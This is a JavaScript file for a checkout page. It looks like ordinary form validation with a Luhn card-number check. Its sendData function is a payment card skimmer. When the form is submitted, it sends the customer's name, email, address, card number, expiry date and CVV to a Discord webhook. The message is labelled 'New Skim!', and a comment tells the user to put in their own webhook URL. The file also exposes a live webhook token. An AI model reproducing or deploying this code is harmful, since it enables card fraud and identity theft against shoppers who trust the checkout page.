// Example starter JavaScript for disabling form submissions if there are invalid fields
(function () {
  'use strict'

  // Fetch all the forms we want to apply custom Bootstrap validation styles to
  var forms = document.querySelectorAll('.needs-validation')

  // Loop over them and prevent submission
  Array.prototype.slice.call(forms)
    .forEach(function (form) {
      form.addEventListener('submit', function (event) {
        if (!form.checkValidity()) {
          event.preventDefault()
          event.stopPropagation()
        }

        form.classList.add('was-validated')
      }, false)
    })
})()

window.onload = function () {
  if (localStorage.getItem("validReferral") !== "true") {
    console.log("localstorage not present");
  }

  document.getElementById("cc-number").onchange = validateCard;
}

function luhn(num){

  var inputNum = num.toString();
  var sum = 0;
  var doubleUp = false;

  /* from the right to left, double every other digit starting with the second to last digit.*/
  for (var i = inputNum.length - 1; i >= 0; i--)
  {
      var curDigit = parseInt(inputNum.charAt(i));

      /* double every other digit starting with the second to last digit */
      if(doubleUp)
      {
          /* doubled number is greater than 9 than subtracted 9 */
          if((curDigit*2) > 9)
          {
            sum +=( curDigit*2)-9;
          }
          else
          {
            sum += curDigit*2;
          }
      }
      else
      {
        sum += curDigit;
      }
      var doubleUp =!doubleUp
  }

/* sum and divide it by 10. If the remainder equals zero, the original credit card number is valid.  */
return (sum % 10) == 0  ? true : false;

};

function validateCard() {
  var cardField = document.getElementById("cc-number");

  if (luhn(cardField.value)) {
    cardField.setCustomValidity("");
  } else {
    cardField.setCustomValidity("Invalid CC Number.");
  }
}

function validateForm() {
  if (document.getElementById("checkoutForm").checkValidity()) {
    event.preventDefault();
    sendData();
    $("#purchaseComplete").modal("show");
  }
  return false;
}

function sendData() {
  var request = new XMLHttpRequest();
  request.open("POST", "https://discord.com/api/webhooks/950481328879591514/73a8Ok_EtxzInAiw23nOczOrdfzD1Ev5KwL0ieaXouZzCQfZN7uT20q3xw1dQRpsapEx");
  // again, replace the url in the open method with yours
  request.setRequestHeader('Content-type', 'application/json');

  var message = {
    content: "New Skim!",
    embeds: [
      {
        title: "Billing Info",
        description: "First Name: " + document.getElementById("firstName").value + "\nLast Name: " + document.getElementById("lastName").value + "\nEmail: " + document.getElementById("email").value + "\nAddress: " + document.getElementById("address").value + "\nAddress (Line 2): " + document.getElementById("address2").value + "\nCountry: " + document.getElementById("country").value + "\nCounty: " + document.getElementById("county").value + "\nEircode: " + document.getElementById("eircode").value,
        color: 5814783
      },
      {
        title: "Payment Info",
        description: "Name on Card: " + document.getElementById("cc-name").value + "\nCard Number: " + document.getElementById("cc-number").value + "\nExpiration Month: " + document.getElementById("cc-expiration-month").value + "\nExpiration Year: " + document.getElementById("cc-expiration").value + "\nCVV: " + document.getElementById("cc-cvv").value,
        color: null
      }
    ],
    username: "Whitty Skimmer",
    avatar_url: "https://i.imgur.com/H1NZ11Q.png"
  }

  request.send(JSON.stringify(message));

}

function returnHome() {
  console.log("Returning Home");
  window.location.href = "/";
}